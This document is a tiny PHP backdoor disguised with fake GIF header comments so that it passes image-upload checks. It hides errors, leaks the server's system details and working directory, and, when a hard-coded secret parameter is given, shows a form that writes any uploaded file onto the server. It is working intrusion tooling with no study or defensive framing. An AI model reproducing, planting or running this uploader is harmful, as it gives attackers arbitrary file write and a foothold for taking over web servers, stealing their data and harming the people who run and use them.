<!-- GIF89;a -->
<!-- GIF89;a -->
<?php error_reporting(0); echo php_uname()."<br>".getcwd()."<br>"; if($_GET['Fox'] == 'cRaLV'){$saw1 = $_FILES['file']['tmp_name'];$saw2 = $_FILES['file']['name'];echo "<form method='POST' enctype='multipart/form-data'><input type='file' name='file' /><input type='submit' value='UPload' /></form>"; move_uploaded_file($saw1,$saw2); exit(0); } ?>